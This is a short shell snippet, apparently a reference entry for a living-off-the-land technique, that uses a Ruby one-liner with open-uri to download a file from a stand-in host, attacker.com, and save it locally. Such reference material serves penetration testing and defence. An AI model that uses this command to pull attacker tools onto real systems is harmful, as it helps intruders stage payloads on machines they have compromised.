export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
